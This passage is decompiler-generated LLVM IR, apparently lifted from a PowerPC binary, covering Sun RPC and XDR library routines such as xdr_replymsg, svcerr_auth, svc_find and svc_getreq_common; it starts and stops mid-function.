  %v0_10012380 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10012380, i32* @r3, align 4
  %v3_10012384 = icmp eq i32 %v2_10012378, 0
  br i1 %v3_10012384, label %dec_label_pc_10012398, label %dec_label_pc_10012390

dec_label_pc_10012390:                            ; preds = %dec_label_pc_10012378
  %v3_10012388 = icmp eq i32 %v2_10012378, 1
  br i1 %v3_10012388, label %dec_label_pc_100123c0, label %dec_label_pc_100123dc

dec_label_pc_10012398:                            ; preds = %dec_label_pc_10012378
  store i32 268510108, i32* @lr, align 4
  %v0_10012398 = call i32 @xdr_u_long()
  %v0_1001239c = load i32, i32* @r31, align 4
  %v1_1001239c = add i32 %v0_1001239c, 8
  store i32 %v1_1001239c, i32* @r4, align 4
  %v3_100123a0 = icmp eq i32 %v0_10012398, 0
  %v0_100123a4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100123a4, i32* @r3, align 4
  br i1 %v3_100123a0, label %dec_label_pc_100123dc, label %dec_label_pc_100123ac

dec_label_pc_100123ac:                            ; preds = %dec_label_pc_10012398
  store i32 %v0_10012354, i32* @lr, align 4
  %v0_100123bc = call i32 @xdr_u_long()
  %v0_100123c4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100123c0

dec_label_pc_100123c0:                            ; preds = %dec_label_pc_10012390, %dec_label_pc_100123ac
  %v0_100123c4 = phi i32 [ %v0_10012380, %dec_label_pc_10012390 ], [ %v0_100123c4.pre, %dec_label_pc_100123ac ]
  store i32 %v0_100123c4, i32* @r3, align 4
  store i32 %v0_10012354, i32* @lr, align 4
  %v0_100123d8 = call i32 @xdr_enum()
  br label %dec_label_pc_100123dc

dec_label_pc_100123dc:                            ; preds = %dec_label_pc_10012390, %dec_label_pc_10012398, %entry, %dec_label_pc_100123c0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10012354, { 1, 0 }
  uselistorder label %dec_label_pc_100123dc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_100123c0, { 1, 0 }
}

define i32 @__GI_xdr_replymsg(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100123f4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268510224, i32* @lr, align 4
  %v0_1001240c = call i32 @xdr_u_long()
  %v3_10012414 = icmp eq i32 %v0_1001240c, 0
  %v0_10012418 = load i32, i32* @r30, align 4
  store i32 %v0_10012418, i32* @r3, align 4
  br i1 %v3_10012414, label %dec_label_pc_10012464, label %dec_label_pc_10012420

dec_label_pc_10012420:                            ; preds = %entry
  store i32 268510244, i32* @lr, align 4
  %v0_10012420 = call i32 @xdr_enum()
  %v3_10012424 = icmp eq i32 %v0_10012420, 0
  br i1 %v3_10012424, label %dec_label_pc_10012464, label %dec_label_pc_1001242c

dec_label_pc_1001242c:                            ; preds = %dec_label_pc_10012420
  %v0_1001242c = load i32, i32* @r31, align 4
  %v1_1001242c = add i32 %v0_1001242c, 4
  %v2_1001242c = inttoptr i32 %v1_1001242c to i32*
  %v3_1001242c = load i32, i32* %v2_1001242c, align 4
  %v3_1001243c = icmp eq i32 %v3_1001242c, 1
  br i1 %v3_1001243c, label %dec_label_pc_10012450, label %dec_label_pc_10012464

dec_label_pc_10012450:                            ; preds = %dec_label_pc_1001242c
  %v1_10012444 = add i32 %v0_1001242c, 8
  %v1_10012438 = add i32 %v0_1001242c, 12
  %v0_10012434 = load i32, i32* @r30, align 4
  store i32 %v0_100123f4, i32* @lr, align 4
  %v5_10012460 = inttoptr i32 %v1_10012444 to i32*
  %v6_10012460 = call i32 @xdr_union(i32 %v0_10012434, i32* %v5_10012460, i32 %v1_10012438, i32 ptrtoint (i32* @global_var_10019fec.507 to i32), i32 0)
  br label %dec_label_pc_10012464

dec_label_pc_10012464:                            ; preds = %dec_label_pc_1001242c, %dec_label_pc_10012420, %entry, %dec_label_pc_10012450
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001242c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012464, { 3, 0, 1, 2 }
}

define i32 @xdr_des_block() local_unnamed_addr {
entry:
  store i32 8, i32* @r5, align 4
  %v2_10012480 = call i32 @xdr_opaque(i32* inttoptr (i32 8 to i32*))
  ret i32 %v2_10012480
}

define i32 @xdr_opaque_auth() local_unnamed_addr {
entry:
  %v0_10012484 = load i32, i32* @lr, align 4
  %v0_10012490 = load i32, i32* @r4, align 4
  %v0_10012498 = load i32, i32* @r3, align 4
  store i32 %v0_10012498, i32* @r31, align 4
  store i32 268510368, i32* @lr, align 4
  %v0_1001249c = call i32 @xdr_enum()
  %v3_100124a4 = icmp eq i32 %v0_1001249c, 0
  br i1 %v3_100124a4, label %dec_label_pc_100124cc, label %dec_label_pc_100124b4

dec_label_pc_100124b4:                            ; preds = %entry
  %v1_100124a8 = add i32 %v0_10012490, 4
  %v1_100124a0 = add i32 %v0_10012490, 8
  %v0_100124b8 = load i32, i32* @r31, align 4
  store i32 %v0_10012484, i32* @lr, align 4
  %v4_100124c8 = inttoptr i32 %v0_100124b8 to i32*
  %v5_100124c8 = call i32 @xdr_bytes(i32* %v4_100124c8, i32 %v1_100124a8, i32 %v1_100124a0, i32 400)
  br label %dec_label_pc_100124cc

dec_label_pc_100124cc:                            ; preds = %entry, %dec_label_pc_100124b4
  %v0_100124dc = phi i32 [ 0, %entry ], [ %v5_100124c8, %dec_label_pc_100124b4 ]
  ret i32 %v0_100124dc

; uselistorder directives
  uselistorder label %dec_label_pc_100124cc, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100124e0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268510460, i32* @lr, align 4
  %v0_100124f8 = call i32 @xdr_opaque_auth()
  %v3_10012500 = icmp eq i32 %v0_100124f8, 0
  %v0_10012504 = load i32, i32* @r30, align 4
  store i32 %v0_10012504, i32* @r3, align 4
  br i1 %v3_10012500, label %dec_label_pc_10012584, label %dec_label_pc_1001250c

dec_label_pc_1001250c:                            ; preds = %entry
  store i32 268510480, i32* @lr, align 4
  %v0_1001250c = call i32 @xdr_enum()
  store i32 %v0_1001250c, i32* %r3.global-to-local, align 4
  %v3_10012510 = icmp eq i32 %v0_1001250c, 0
  br i1 %v3_10012510, label %dec_label_pc_10012584, label %dec_label_pc_10012518

dec_label_pc_10012518:                            ; preds = %dec_label_pc_1001250c
  %v0_10012518 = load i32, i32* @r31, align 4
  %v1_10012518 = add i32 %v0_10012518, 12
  %v2_10012518 = inttoptr i32 %v1_10012518 to i32*
  %v3_10012518 = load i32, i32* %v2_10012518, align 4
  %v0_1001251c = load i32, i32* @r30, align 4
  store i32 %v0_1001251c, i32* %r3.global-to-local, align 4
  %v3_10012520 = icmp eq i32 %v3_10012518, 0
  br i1 %v3_10012520, label %dec_label_pc_10012538, label %dec_label_pc_10012530

dec_label_pc_10012530:                            ; preds = %dec_label_pc_10012518
  %v3_10012524 = icmp eq i32 %v3_10012518, 2
  br i1 %v3_10012524, label %dec_label_pc_10012554, label %dec_label_pc_10012588

dec_label_pc_10012538:                            ; preds = %dec_label_pc_10012518
  %v1_1001253c = add i32 %v0_10012518, 20
  %v2_1001253c = inttoptr i32 %v1_1001253c to i32*
  %v3_1001253c = load i32, i32* %v2_1001253c, align 4
  call void @__pseudo_call(i32 %v3_1001253c)
  %v0_1001254c = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012588

dec_label_pc_10012554:                            ; preds = %dec_label_pc_10012530
  %v1_10012554 = add i32 %v0_10012518, 16
  store i32 %v1_10012554, i32* @r4, align 4
  store i32 %v0_1001251c, i32* @r3, align 4
  store i32 268510560, i32* @lr, align 4
  %v0_1001255c = call i32 @xdr_u_long()
  %v0_10012560 = load i32, i32* @r31, align 4
  %v1_10012560 = add i32 %v0_10012560, 20
  store i32 %v1_10012560, i32* @r4, align 4
  %v3_10012564 = icmp eq i32 %v0_1001255c, 0
  %v0_10012568 = load i32, i32* @r30, align 4
  store i32 %v0_10012568, i32* @r3, align 4
  br i1 %v3_10012564, label %dec_label_pc_10012584, label %dec_label_pc_10012570

dec_label_pc_10012570:                            ; preds = %dec_label_pc_10012554
  store i32 %v0_100124e0, i32* @lr, align 4
  %v0_10012580 = call i32 @xdr_u_long()
  store i32 %v0_10012580, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012584

dec_label_pc_10012584:                            ; preds = %dec_label_pc_10012554, %dec_label_pc_1001250c, %entry, %dec_label_pc_10012570
  br label %dec_label_pc_10012588

dec_label_pc_10012588:                            ; preds = %dec_label_pc_10012530, %dec_label_pc_10012538, %dec_label_pc_10012584
  %v0_10012588 = phi i32 [ 1, %dec_label_pc_10012530 ], [ %v0_1001254c, %dec_label_pc_10012538 ], [ 0, %dec_label_pc_10012584 ]
  store i32 %v0_10012588, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012588

; uselistorder directives
  uselistorder i32 %v0_10012588, { 1, 0 }
  uselistorder i32 %v0_10012518, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012588, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012584, { 3, 0, 1, 2 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_100125e4 = add i32 %arg1, 8
  %v2_100125e4 = inttoptr i32 %v1_100125e4 to i32*
  %v3_100125e4 = load i32, i32* %v2_100125e4, align 4
  %v1_100125e8 = add i32 %v3_100125e4, 12
  %v2_100125e8 = inttoptr i32 %v1_100125e8 to i32*
  %v3_100125e8 = load i32, i32* %v2_100125e8, align 4
  call void @__pseudo_call(i32 %v3_100125e8)
  ret i32 %arg1
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10012640 = add i32 %arg1, 8
  %v2_10012640 = inttoptr i32 %v1_10012640 to i32*
  %v3_10012640 = load i32, i32* %v2_10012640, align 4
  %v1_10012644 = add i32 %v3_10012640, 12
  %v2_10012644 = inttoptr i32 %v1_10012644 to i32*
  %v3_10012644 = load i32, i32* %v2_10012644, align 4
  call void @__pseudo_call(i32 %v3_10012644)
  ret i32 %arg1
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10012698 = add i32 %arg1, 8
  %v2_10012698 = inttoptr i32 %v1_10012698 to i32*
  %v3_10012698 = load i32, i32* %v2_10012698, align 4
  %v1_1001269c = add i32 %v3_10012698, 12
  %v2_1001269c = inttoptr i32 %v1_1001269c to i32*
  %v3_1001269c = load i32, i32* %v2_1001269c, align 4
  call void @__pseudo_call(i32 %v3_1001269c)
  ret i32 %arg1
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100126f0 = add i32 %arg1, 8
  %v2_100126f0 = inttoptr i32 %v1_100126f0 to i32*
  %v3_100126f0 = load i32, i32* %v2_100126f0, align 4
  %v1_100126f4 = add i32 %v3_100126f0, 12
  %v2_100126f4 = inttoptr i32 %v1_100126f4 to i32*
  %v3_100126f4 = load i32, i32* %v2_100126f4, align 4
  call void @__pseudo_call(i32 %v3_100126f4)
  ret i32 %arg1
}

define i32 @svcerr_auth(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10012734 = add i32 %arg1, 8
  %v2_10012734 = inttoptr i32 %v1_10012734 to i32*
  %v3_10012734 = load i32, i32* %v2_10012734, align 4
  %v1_10012738 = add i32 %v3_10012734, 12
  %v2_10012738 = inttoptr i32 %v1_10012738 to i32*
  %v3_10012738 = load i32, i32* %v2_10012738, align 4
  call void @__pseudo_call(i32 %v3_10012738)
  ret i32 %arg1
}

define i32 @svcerr_weakauth() local_unnamed_addr {
entry:
  %v1_10012758 = call i32 @svcerr_auth(i32 5)
  ret i32 %v1_10012758
}

define i32 @__GI_svcerr_noprog(i32 %arg1) local_unnamed_addr {
entry:
  store i32 1, i32* @r10, align 4
  %v1_10012790 = add i32 %arg1, 8
  %v2_10012790 = inttoptr i32 %v1_10012790 to i32*
  %v3_10012790 = load i32, i32* %v2_10012790, align 4
  %v1_10012794 = add i32 %v3_10012790, 12
  %v2_10012794 = inttoptr i32 %v1_10012794 to i32*
  %v3_10012794 = load i32, i32* %v2_10012794, align 4
  call void @__pseudo_call(i32 %v3_10012794)
  ret i32 %arg1
}

define i32 @svcerr_progvers(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100127cc = load i32, i32* @r5, align 4
  store i32 %v0_100127cc, i32* @r29, align 4
  %v1_100127f8 = add i32 %arg1, 8
  %v2_100127f8 = inttoptr i32 %v1_100127f8 to i32*
  %v3_100127f8 = load i32, i32* %v2_100127f8, align 4
  %v1_100127fc = add i32 %v3_100127f8, 12
  %v2_100127fc = inttoptr i32 %v1_100127fc to i32*
  %v3_100127fc = load i32, i32* %v2_100127fc, align 4
  call void @__pseudo_call(i32 %v3_100127fc)
  ret i32 %arg1
}

define i32 @svc_find(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v0_10012830 = load i32, i32* @r4, align 4
  store i32 %v0_10012830, i32* @r31, align 4
  %v0_10012834 = load i32, i32* @r5, align 4
  store i32 %v0_10012834, i32* @r30, align 4
  store i32 268511292, i32* @lr, align 4
  %v0_10012838 = call i32 @__rpc_thread_variables()
  store i32 %v0_10012838, i32* %r3.global-to-local, align 4
  %v1_1001283c = add i32 %v0_10012838, 184
  %v2_1001283c = inttoptr i32 %v1_1001283c to i32*
  %v3_1001283c = load i32, i32* %v2_1001283c, align 4
  store i32 %v3_1001283c, i32* %r3.global-to-local, align 4
  %v3_100128683 = icmp eq i32 %v3_1001283c, 0
  br i1 %v3_100128683, label %dec_label_pc_10012870, label %dec_label_pc_10012848.lr.ph

dec_label_pc_10012848.lr.ph:                      ; preds = %entry
  %v1_1001284c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10012848

dec_label_pc_10012848:                            ; preds = %dec_label_pc_10012848.lr.ph, %dec_label_pc_10012860
  %v0_100128706 = phi i32 [ 0, %dec_label_pc_10012848.lr.ph ], [ %v0_10012860, %dec_label_pc_10012860 ]
  %v0_10012860 = phi i32 [ %v3_1001283c, %dec_label_pc_10012848.lr.ph ], [ %v2_10012864, %dec_label_pc_10012860 ]
  %v1_10012848 = add i32 %v0_10012860, 4
  %v2_10012848 = inttoptr i32 %v1_10012848 to i32*
  %v3_10012848 = load i32, i32* %v2_10012848, align 4
  %v4_1001284c = icmp eq i32 %v3_10012848, %v1_1001284c.pre
  br i1 %v4_1001284c, label %dec_label_pc_10012854, label %dec_label_pc_10012860

dec_label_pc_10012854:                            ; preds = %dec_label_pc_10012848
  %v1_10012854 = add i32 %v0_10012860, 8
  %v2_10012854 = inttoptr i32 %v1_10012854 to i32*
  %v3_10012854 = load i32, i32* %v2_10012854, align 4
  %v1_10012858 = load i32, i32* @r31, align 4
  %v4_10012858 = icmp eq i32 %v3_10012854, %v1_10012858
  br i1 %v4_10012858, label %dec_label_pc_10012854.dec_label_pc_10012870_crit_edge, label %dec_label_pc_10012860

dec_label_pc_10012860:                            ; preds = %dec_label_pc_10012848, %dec_label_pc_10012854
  %v1_10012864 = inttoptr i32 %v0_10012860 to i32*
  %v2_10012864 = load i32, i32* %v1_10012864, align 4
  store i32 %v2_10012864, i32* %r3.global-to-local, align 4
  %v3_10012868 = icmp eq i32 %v2_10012864, 0
  br i1 %v3_10012868, label %dec_label_pc_10012868.dec_label_pc_10012870_crit_edge, label %dec_label_pc_10012848

dec_label_pc_10012868.dec_label_pc_10012870_crit_edge: ; preds = %dec_label_pc_10012860
  br label %dec_label_pc_10012870

dec_label_pc_10012854.dec_label_pc_10012870_crit_edge: ; preds = %dec_label_pc_10012854
  br label %dec_label_pc_10012870

dec_label_pc_10012870:                            ; preds = %dec_label_pc_10012854.dec_label_pc_10012870_crit_edge, %dec_label_pc_10012868.dec_label_pc_10012870_crit_edge, %entry
  %v0_10012870 = phi i32 [ %v0_100128706, %dec_label_pc_10012854.dec_label_pc_10012870_crit_edge ], [ %v0_10012860, %dec_label_pc_10012868.dec_label_pc_10012870_crit_edge ], [ 0, %entry ]
  %v1_10012870 = load i32, i32* @r30, align 4
  %v2_10012870 = inttoptr i32 %v1_10012870 to i32*
  store i32 %v0_10012870, i32* %v2_10012870, align 4
  %v0_10012884 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012884

; uselistorder directives
  uselistorder i32 %v2_10012864, { 1, 2, 0 }
  uselistorder i32 %v0_10012860, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_10012860, { 1, 0 }
  uselistorder label %dec_label_pc_10012848, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1304 = alloca i32, align 4
  %stack_var_-1292 = alloca i32, align 4
  %stack_var_-1248 = alloca i32, align 4
  %stack_var_-1272 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268511408, i32* @lr, align 4
  %v0_100128ac = call i32 @__rpc_thread_variables()
  %v1_100128b0 = add i32 %v0_100128ac, 180
  %v2_100128b0 = inttoptr i32 %v1_100128b0 to i32*
  %v3_100128b0 = load i32, i32* %v2_100128b0, align 4
  %v0_100128b4 = load i32, i32* @r29, align 4
  %v1_100128b4 = mul i32 %v0_100128b4, 4
  store i32 %v0_100128ac, i32* @r30, align 4
  %v2_100128bc = add i32 %v1_100128b4, %v3_100128b0
  %v3_100128bc = inttoptr i32 %v2_100128bc to i32*
  %v4_100128bc = load i32, i32* %v3_100128bc, align 4
  store i32 %v4_100128bc, i32* @r29, align 4
  %v3_100128c0 = icmp eq i32 %v4_100128bc, 0
  br i1 %v3_100128c0, label %dec_label_pc_10012a38, label %dec_label_pc_100128c8.preheader

dec_label_pc_100128c8.preheader:                  ; preds = %entry
  %v2_100128cc = ptrtoint i32* %stack_var_-1272 to i32
  %v2_10012904 = ptrtoint i32* %stack_var_-1292 to i32
  %v2_100129e0 = ptrtoint i32* %stack_var_-1304 to i32
  br label %dec_label_pc_100128c8

dec_label_pc_100128c8:                            ; preds = %dec_label_pc_10012a30.dec_label_pc_100128c8_crit_edge, %dec_label_pc_100128c8.preheader
  %v0_100128c8 = phi i32 [ %v0_100128c8.pre, %dec_label_pc_10012a30.dec_label_pc_100128c8_crit_edge ], [ %v4_100128bc, %dec_label_pc_100128c8.preheader ]
  %v1_100128c8 = add i32 %v0_100128c8, 8
  %v2_100128c8 = inttoptr i32 %v1_100128c8 to i32*
  %v3_100128c8 = load i32, i32* %v2_100128c8, align 4
  store i32 %v2_100128cc, i32* @r31, align 4
  %v1_100128d8 = inttoptr i32 %v3_100128c8 to i32*
  %v2_100128d8 = load i32, i32* %v1_100128d8, align 4
  call void @__pseudo_call(i32 %v2_100128d8)
  %v3_100128e4 = icmp eq i32 %v0_100128c8, 0
  br i1 %v3_100128e4, label %dec_label_pc_100129fc, label %dec_label_pc_100128ec

dec_label_pc_100128ec:                            ; preds = %dec_label_pc_100128c8
  %v3_100128f0 = load i32, i32* %stack_var_-1248, align 4
  store i32 %v3_100128f0, i32* %r10.global-to-local, align 4
  %v3_10012900 = icmp eq i32 %v3_100128f0, 0
  %v0_10012908 = load i32, i32* @r29, align 4
  br i1 %v3_10012900, label %dec_label_pc_1001292c, label %dec_label_pc_10012944

dec_label_pc_1001292c:                            ; preds = %dec_label_pc_100128ec
  %v3_10012930 = load i32, i32* @global_var_10033c00.494, align 4
  %v2_10012934 = add i32 %v0_10012908, 32
  %v3_10012934 = inttoptr i32 %v2_10012934 to i32*
  store i32 %v3_10012930, i32* %v3_10012934, align 4
  %v0_1001293c = load i32, i32* %r10.global-to-local, align 4
  %v2_1001293c = add i32 %v0_10012908, 40
  %v3_1001293c = inttoptr i32 %v2_1001293c to i32*
  store i32 %v0_1001293c, i32* %v3_1001293c, align 4
  br label %dec_label_pc_10012968

dec_label_pc_10012944:                            ; preds = %dec_label_pc_100128ec
  store i32 268511568, i32* @lr, align 4
  %v3_1001294c = call i32 @_authenticate(i32 %v2_100129e0, i32 %v2_100128cc, i32 %v2_10012904)
  %v3_10012950 = icmp eq i32 %v3_1001294c, 0
  br i1 %v3_10012950, label %dec_label_pc_10012968, label %dec_label_pc_10012958

dec_label_pc_10012958:                            ; preds = %dec_label_pc_10012944
  %v0_1001295c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10012964.508 to i32), i32* @lr, align 4
  %v2_10012960 = call i32 @svcerr_auth(i32 %v0_1001295c)
  br label %dec_label_pc_100129fc

dec_label_pc_10012968:                            ; preds = %dec_label_pc_10012944, %dec_label_pc_1001292c
  %v0_10012968 = load i32, i32* @r30, align 4
  %v1_10012968 = add i32 %v0_10012968, 184
  %v2_10012968 = inttoptr i32 %v1_10012968 to i32*
  %v3_10012968 = load i32, i32* %v2_10012968, align 4
  %v3_10012970 = load i32, i32* %stack_var_-1304, align 4
  store i32 %v3_10012970, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  store i32 %tmp20, i32* @r10, align 4
  %v3_100129c03 = icmp eq i32 %v3_10012968, 0
  br i1 %v3_100129c03, label %dec_label_pc_100129c8, label %dec_label_pc_10012984

dec_label_pc_10012984:                            ; preds = %dec_label_pc_10012968, %dec_label_pc_100129bc
  %v0_100129c815 = phi i32 [ %v0_100129c814, %dec_label_pc_100129bc ], [ 0, %dec_label_pc_10012968 ]
  %v1_100129a0 = phi i32 [ %v1_100129a013, %dec_label_pc_100129bc ], [ 0, %dec_label_pc_10012968 ]
  %v0_1001299c = phi i32 [ %v0_1001299c10, %dec_label_pc_100129bc ], [ -1, %dec_label_pc_10012968 ]
  %v0_100129dc = phi i32 [ %v2_100129bc, %dec_label_pc_100129bc ], [ %v3_10012968, %dec_label_pc_10012968 ]
  %v1_10012984 = add i32 %v0_100129dc, 4
  %v2_10012984 = inttoptr i32 %v1_10012984 to i32*
  %v3_10012984 = load i32, i32* %v2_10012984, align 4
  %v4_10012988 = icmp eq i32 %v3_10012984, %v3_10012970
  br i1 %v4_10012988, label %dec_label_pc_10012990, label %dec_label_pc_100129bc

dec_label_pc_10012990:                            ; preds = %dec_label_pc_10012984
  %v1_10012990 = add i32 %v0_100129dc, 8
  %v2_10012990 = inttoptr i32 %v1_10012990 to i32*
  %v3_10012990 = load i32, i32* %v2_10012990, align 4
  %v4_10012998 = icmp eq i32 %v3_10012990, %tmp20
  br i1 %v4_10012998, label %dec_label_pc_100129dc, label %dec_label_pc_100129a8

dec_label_pc_100129a8:                            ; preds = %dec_label_pc_10012990
  %v3_1001299c = icmp ugt i32 %v0_1001299c, %v3_10012990
  br i1 %v3_1001299c, label %dec_label_pc_100129ac, label %dec_label_pc_100129b0

dec_label_pc_100129ac:                            ; preds = %dec_label_pc_100129a8
  br label %dec_label_pc_100129b0

dec_label_pc_100129b0:                            ; preds = %dec_label_pc_100129a8, %dec_label_pc_100129ac
  %v0_1001299c11 = phi i32 [ %v0_1001299c, %dec_label_pc_100129a8 ], [ %v3_10012990, %dec_label_pc_100129ac ]
  %tmp37 = icmp ugt i32 %v3_10012990, %v1_100129a0
  br i1 %tmp37, label %dec_label_pc_100129b4, label %dec_label_pc_100129bc

dec_label_pc_100129b4:                            ; preds = %dec_label_pc_100129b0
  store i32 %v3_10012990, i32* @r5, align 4
  br label %dec_label_pc_100129bc

dec_label_pc_100129bc:                            ; preds = %dec_label_pc_100129b0, %dec_label_pc_10012984, %dec_label_pc_100129b4
  %v0_100129c814 = phi i32 [ %v0_100129c815, %dec_label_pc_10012984 ], [ 1, %dec_label_pc_100129b0 ], [ 1, %dec_label_pc_100129b4 ]
  %v1_100129a013 = phi i32 [ %v1_100129a0, %dec_label_pc_10012984 ], [ %v1_100129a0, %dec_label_pc_100129b0 ], [ %v3_10012990, %dec_label_pc_100129b4 ]
  %v0_1001299c10 = phi i32 [ %v0_1001299c, %dec_label_pc_10012984 ], [ %v0_1001299c11, %dec_label_pc_100129b0 ], [ %v0_1001299c11, %dec_label_pc_100129b4 ]
  %v1_100129bc = inttoptr i32 %v0_100129dc to i32*
  %v2_100129bc = load i32, i32* %v1_100129bc, align 4
  %v3_100129c0 = icmp eq i32 %v2_100129bc, 0
  br i1 %v3_100129c0, label %dec_label_pc_100129c0.dec_label_pc_100129c8_crit_edge, label %dec_label_pc_10012984

dec_label_pc_100129c0.dec_label_pc_100129c8_crit_edge: ; preds = %dec_label_pc_100129bc
  br label %dec_label_pc_100129c8

dec_label_pc_100129c8:                            ; preds = %dec_label_pc_100129c0.dec_label_pc_100129c8_crit_edge, %dec_label_pc_10012968
  %v0_100129c8 = phi i32 [ %v0_100129c814, %dec_label_pc_100129c0.dec_label_pc_100129c8_crit_edge ], [ 0, %dec_label_pc_10012968 ]
  %v3_100129c8 = icmp eq i32 %v0_100129c8, 0
  %v0_100129f4 = load i32, i32* @r29, align 4
  br i1 %v3_100129c8, label %dec_label_pc_100129f4, label %dec_label_pc_100129d0

dec_label_pc_100129d0:                            ; preds = %dec_label_pc_100129c8
  store i32 ptrtoint (i32* @global_var_100129d8.509 to i32), i32* @lr, align 4
  %v1_100129d4 = call i32 @svcerr_progvers(i32 %v0_100129f4)
  br label %dec_label_pc_100129fc

dec_label_pc_100129dc:                            ; preds = %dec_label_pc_10012990
  %v1_100129dc = add i32 %v0_100129dc, 12
  %v2_100129dc = inttoptr i32 %v1_100129dc to i32*
  %v3_100129dc = load i32, i32* %v2_100129dc, align 4
  call void @__pseudo_call(i32 %v3_100129dc)
  br label %dec_label_pc_100129fc

dec_label_pc_100129f4:                            ; preds = %dec_label_pc_100129c8
  store i32 268511740, i32* @lr, align 4
  %v1_100129f8 = call i32 @__GI_svcerr_noprog(i32 %v0_100129f4)
  br label %dec_label_pc_100129fc

dec_label_pc_100129fc:                            ; preds = %dec_label_pc_100128c8, %dec_label_pc_100129dc, %dec_label_pc_100129d0, %dec_label_pc_10012958, %dec_label_pc_100129f4
  %v0_100129fc = load i32, i32* @r29, align 4
  %v1_100129fc = add i32 %v0_100129fc, 8
  %v2_100129fc = inttoptr i32 %v1_100129fc to i32*
  %v3_100129fc = load i32, i32* %v2_100129fc, align 4
  %v1_10012a04 = add i32 %v3_100129fc, 4
  %v2_10012a04 = inttoptr i32 %v1_10012a04 to i32*
  %v3_10012a04 = load i32, i32* %v2_10012a04, align 4
  call void @__pseudo_call(i32 %v3_10012a04)
  %v3_10012a10 = icmp eq i32 %v0_100129fc, 0
  br i1 %v3_10012a10, label %dec_label_pc_10012a18, label %dec_label_pc_10012a30

dec_label_pc_10012a18:                            ; preds = %dec_label_pc_100129fc
  %v0_10012a18 = load i32, i32* @r29, align 4
  %v1_10012a18 = add i32 %v0_10012a18, 8
  %v2_10012a18 = inttoptr i32 %v1_10012a18 to i32*
  %v3_10012a18 = load i32, i32* %v2_10012a18, align 4
  %v1_10012a20 = add i32 %v3_10012a18, 20
  %v2_10012a20 = inttoptr i32 %v1_10012a20 to i32*
  %v3_10012a20 = load i32, i32* %v2_10012a20, align 4
  call void @__pseudo_call(i32 %v3_10012a20)
  br label %dec_label_pc_10012a38

dec_label_pc_10012a30:                            ; preds = %dec_label_pc_100129fc
  %v3_10012a30 = icmp eq i32 %v0_100129fc, 1
  br i1 %v3_10012a30, label %dec_label_pc_10012a30.dec_label_pc_100128c8_crit_edge, label %dec_label_pc_10012a38

dec_label_pc_10012a30.dec_label_pc_100128c8_crit_edge: ; preds = %dec_label_pc_10012a30
  %v0_100128c8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100128c8

dec_label_pc_10012a38:                            ; preds = %dec_label_pc_10012a30, %entry, %dec_label_pc_10012a18
  %v0_10012a48 = phi i32 [ %v0_100128ac, %entry ], [ %v0_10012a18, %dec_label_pc_10012a18 ], [ %v0_100129fc, %dec_label_pc_10012a30 ]
  ret i32 %v0_10012a48

; uselistorder directives
  uselistorder i32 %v0_100129fc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_100129f4, { 1, 0 }
  uselistorder i32 %v2_100129bc, { 1, 0 }
  uselistorder i32 %v3_10012990, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v0_1001299c, { 2, 1, 0 }
  uselistorder i32 %v1_100129a0, { 1, 2, 0 }
  uselistorder i32 %v0_10012908, { 1, 0 }
  uselistorder label %dec_label_pc_10012a38, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100129fc, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_100129bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100129b0, { 1, 0 }
  uselistorder label %dec_label_pc_10012984, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r29, align 4
  store i32 268511844, i32* @lr, align 4
  %v0_10012a60 = call i32 @_rpc_dtablesize()
  store i32 %v0_10012a60, i32* @r27, align 4
  store i32 0, i32* @r28, align 4
  %v2_10012aac3 = icmp sgt i32 %v0_10012a60, 0
  br i1 %v2_10012aac3, label %dec_label_pc_10012a70.lr.ph, label %dec_label_pc_10012ab4

